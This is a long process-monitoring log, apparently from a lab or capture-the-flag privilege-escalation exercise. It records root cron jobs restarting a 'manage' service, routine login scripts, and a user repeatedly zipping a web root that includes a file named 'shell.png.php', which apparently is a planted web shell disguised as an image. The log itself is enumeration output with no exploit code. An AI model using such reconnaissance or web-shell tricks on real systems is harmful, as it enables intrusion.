+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12675  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12674  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12673  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12672  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12671  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:20:39 [34;1mCMD: UID=0     PID=12681  | (time-dir) [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12683  | /usr/sbin/CRON -f [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12685  | systemctl restart manage [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12684  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12686  | /sbin/init [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12696  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12695  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12694  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12693  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12692  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12691  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12690  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12689  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12688  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:01 [34;1mCMD: UID=0     PID=12687  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:05 [34;1mCMD: UID=0     PID=12699  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:21:05 [34;1mCMD: UID=109   PID=12702  | sshd: [net]          [0m
+2025/01/16 12:21:06 [34;1mCMD: UID=0     PID=12703  | /sbin/init [0m
+2025/01/16 12:21:06 [34;1mCMD: UID=0     PID=12704  | (systemd) [0m
+2025/01/16 12:21:07 [34;1mCMD: UID=0     PID=12705  | (sd-pam) [0m
+2025/01/16 12:21:07 [34;1mCMD: UID=0     PID=12707  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:21:07 [34;1mCMD: UID=0     PID=12706  | (sd-executor) [0m
+2025/01/16 12:21:08 [34;1mCMD: UID=0     PID=12709  | /bin/systemctl --user set-environment DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/0/bus [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12711  | [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12710  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12712  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12732  | grep -q -m 1 . [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12731  | find /var/lib/update-notifier/updates-available -newermt now-7 days [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12729  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12740  | cut -d  -f4 [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12739  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12738  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:21:09 [34;1mCMD: UID=0     PID=12737  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12748  | [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12747  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12749  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12750  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12751  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:21:11 [34;1mCMD: UID=0     PID=12752  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12753  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12754  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12755  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12756  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12757  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12758  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12759  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:21:12 [34;1mCMD: UID=0     PID=12760  | [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12762  | [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12761  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12768  | sort -r [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12767  | grep -E overlayroot|/media/root-ro|/media/root-rw /proc/mounts [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12766  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12765  | /bin/sh /etc/update-motd.d/97-overlayroot [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12769  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12773  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12772  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12774  | date +%s [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12775  | [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12776  | [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12777  | sshd: root@pts/2     [0m
+2025/01/16 12:21:13 [34;1mCMD: UID=0     PID=12778  | -bash [0m
+2025/01/16 12:21:14 [34;1mCMD: UID=0     PID=12782  | -bash [0m
+2025/01/16 12:21:14 [34;1mCMD: UID=0     PID=12786  | [0m
+2025/01/16 12:21:14 [34;1mCMD: UID=0     PID=12787  | -bash [0m
+2025/01/16 12:21:14 [34;1mCMD: UID=0     PID=12788  | -bash [0m
+2025/01/16 12:21:14 [32;1mCMD: UID=1003  PID=12789  | su - orville [0m
+2025/01/16 12:21:15 [32;1mCMD: UID=1003  PID=12791  | [0m
+2025/01/16 12:21:15 [32;1mCMD: UID=1003  PID=12794  | -bash [0m
+2025/01/16 12:21:15 [32;1mCMD: UID=1003  PID=12795  | /bin/sh /usr/bin/lesspipe [0m
+2025/01/16 12:21:16 [32;1mCMD: UID=1003  PID=12799  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:21:21 [32;1mCMD: UID=1003  PID=12800  | [0m
+2025/01/16 12:21:28 [34;1mCMD: UID=0     PID=12801  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12810  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12809  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12808  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12807  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12806  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12805  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12804  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12803  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:29 [34;1mCMD: UID=0     PID=12802  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12820  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12819  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12818  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12817  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12816  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12815  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12814  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12813  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12812  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12811  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:21:39 [34;1mCMD: UID=0     PID=12821  | /sbin/init [0m
+2025/01/16 12:22:01 [34;1mCMD: UID=0     PID=12822  | /usr/sbin/CRON -f [0m
+2025/01/16 12:22:01 [34;1mCMD: UID=0     PID=12823  | /usr/sbin/CRON -f [0m
+2025/01/16 12:22:01 [34;1mCMD: UID=0     PID=12824  | [0m
+2025/01/16 12:22:01 [34;1mCMD: UID=0     PID=12825  | /sbin/init [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12830  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12829  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12828  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12827  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12826  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:02 [34;1mCMD: UID=0     PID=12831  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:05 [34;1mCMD: UID=0     PID=12832  | /usr/sbin/sshd -D -R [0m
+2025/01/16 12:22:05 [34;1mCMD: UID=109   PID=12835  | sshd: [net]          [0m
+2025/01/16 12:22:06 [34;1mCMD: UID=0     PID=12836  | (time-dir) [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12840  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12839  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12838  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12837  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12843  | [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12842  | [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12841  | [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12845  | (sd-pam) [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12844  | /lib/systemd/systemd --user [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12847  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:22:07 [34;1mCMD: UID=0     PID=12846  | (sd-executor) [0m
+2025/01/16 12:22:08 [34;1mCMD: UID=0     PID=12849  | (ystemctl) [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12851  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12850  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12852  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12853  | [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12854  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12855  | [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12856  | /bin/sh /etc/update-motd.d/10-help-text [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12858  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12857  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12861  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12860  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12859  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12862  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:22:09 [34;1mCMD: UID=0     PID=12863  | [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12867  | cut -c -80 [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12866  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12865  | [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12864  | cat /var/cache/motd-news [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12872  | grep -q -m 1 . [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12871  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12869  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12876  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12880  | cut -d  -f4 [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12879  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12878  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:22:10 [34;1mCMD: UID=0     PID=12877  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:22:11 [34;1mCMD: UID=0     PID=12881  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:22:11 [34;1mCMD: UID=0     PID=12888  | systemd-detect-virt -q -c [0m
+2025/01/16 12:22:11 [34;1mCMD: UID=0     PID=12887  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12889  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12890  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12892  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12891  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12893  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12894  | apt-config shell DpkgStatus Dir::State::status [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12895  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12896  | apt-config shell EtcDir Dir::Etc [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12897  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12898  | apt-config shell SourceList Dir::Etc::sourcelist [0m
+2025/01/16 12:22:12 [34;1mCMD: UID=0     PID=12899  | find /var/lib/apt/lists/ /etc/apt/sources.list //var/lib/dpkg/status -type f -newer /var/lib/update-notifier/hwe-eol -print -quit [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12902  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12901  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12904  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12913  | awk {print $1} /proc/uptime [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12912  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12909  | /bin/sh /usr/lib/update-notifier/update-motd-fsck-at-reboot [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12914  | date +%s [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12915  | [0m
+2025/01/16 12:22:13 [36;1mCMD: UID=???   PID=12916  | ???[0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12921  | -bash [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12920  | -bash [0m
+2025/01/16 12:22:13 [34;1mCMD: UID=0     PID=12917  | -bash [0m
+2025/01/16 12:22:14 [34;1mCMD: UID=0     PID=12922  | -bash [0m
+2025/01/16 12:22:14 [34;1mCMD: UID=0     PID=12927  | [0m
+2025/01/16 12:22:14 [34;1mCMD: UID=0     PID=12928  | -bash [0m
+2025/01/16 12:22:14 [32;1mCMD: UID=1003  PID=12929  | -bash [0m
+2025/01/16 12:22:14 [32;1mCMD: UID=1003  PID=12930  | -bash [0m
+2025/01/16 12:22:14 [32;1mCMD: UID=1003  PID=12934  | -bash [0m
+2025/01/16 12:22:15 [32;1mCMD: UID=1003  PID=12938  | dircolors -b [0m
+2025/01/16 12:22:16 [32;1mCMD: UID=1003  PID=12939  | zip -q -r /home/orville/web_snapshot.zip /var/www/html/css /var/www/html/dashboard.php /var/www/html/includes /var/www/html/index.php /var/www/html/login.php /var/www/html/logout.php /var/www/html/navbar.php /var/www/html/register.php /var/www/html/shell.png.php /var/www/html/uploads [0m
+2025/01/16 12:22:21 [32;1mCMD: UID=1003  PID=12940  | [0m
+2025/01/16 12:22:28 [34;1mCMD: UID=0     PID=12944  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:28 [34;1mCMD: UID=0     PID=12943  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:28 [34;1mCMD: UID=0     PID=12942  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:28 [34;1mCMD: UID=0     PID=12941  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:29 [34;1mCMD: UID=0     PID=12945  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12946  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12947  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12952  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12951  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12950  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12949  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12948  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12953  | /lib/systemd/systemd-user-runtime-dir stop 0 [0m
+2025/01/16 12:22:39 [34;1mCMD: UID=0     PID=12954  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:40 [34;1mCMD: UID=0     PID=12956  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:22:40 [34;1mCMD: UID=0     PID=12955  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:01 [34;1mCMD: UID=0     PID=12957  | /usr/sbin/CRON -f [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12959  | systemctl restart manage [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12958  | /bin/sh -c systemctl restart manage [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12960  | /sbin/init [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12969  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12968  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12967  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12966  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12965  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12964  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12963  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12962  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12961  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:02 [34;1mCMD: UID=0     PID=12970  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:06 [34;1mCMD: UID=0     PID=12972  | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m
+2025/01/16 12:23:06 [34;1mCMD: UID=0     PID=12971  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:06 [34;1mCMD: UID=109   PID=12975  | sshd: [net]          [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12981  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12980  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12979  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12978  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12977  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:07 [34;1mCMD: UID=0     PID=12976  | /lib/systemd/systemd-user-runtime-dir start 0 [0m
+2025/01/16 12:23:08 [34;1mCMD: UID=0     PID=12982  | (systemd) [0m
+2025/01/16 12:23:08 [34;1mCMD: UID=0     PID=12983  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:08 [34;1mCMD: UID=0     PID=12984  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:08 [34;1mCMD: UID=0     PID=12985  | (sd-pam) [0m
+2025/01/16 12:23:09 [34;1mCMD: UID=0     PID=12987  | /usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator [0m
+2025/01/16 12:23:09 [34;1mCMD: UID=0     PID=12986  | (sd-executor) [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12990  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12989  | (ystemctl) [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12991  | /lib/systemd/systemd-udevd [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12994  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12993  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12992  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12995  | /bin/sh /etc/update-motd.d/00-header [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12996  | [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12997  | [0m
+2025/01/16 12:23:10 [34;1mCMD: UID=0     PID=12998  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13000  | grep -c ^processor /proc/cpuinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=12999  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13003  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13002  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13001  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13004  | /bin/sh /etc/update-motd.d/50-landscape-sysinfo [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13009  | cut -c -80 [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13008  | tr -d \000-\011\013\014\016-\037 [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13007  | [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13005  | /bin/sh /etc/update-motd.d/50-motd-news [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13010  | [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13011  | run-parts --lsbsysinit /etc/update-motd.d [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13012  | /bin/sh /etc/update-motd.d/90-updates-available [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13017  | gettext To check for new updates run: sudo apt update [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13015  | /bin/sh /usr/share/update-notifier/notify-updates-outdated [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13018  | [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13019  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13022  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13021  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:23:11 [34;1mCMD: UID=0     PID=13020  | /bin/sh /etc/update-motd.d/91-release-upgrade [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13030  | systemd-detect-virt -q -c [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13029  | /bin/sh -e /usr/lib/update-notifier/update-motd-hwe-eol [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13031  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13032  | apt-config shell StateDir Dir::State [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13033  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13034  | apt-config shell ListDir Dir::State::Lists [0m
+2025/01/16 12:23:13 [34;1mCMD: UID=0     PID=13035  | apt-config shell DpkgStatus Dir::State::status [0m
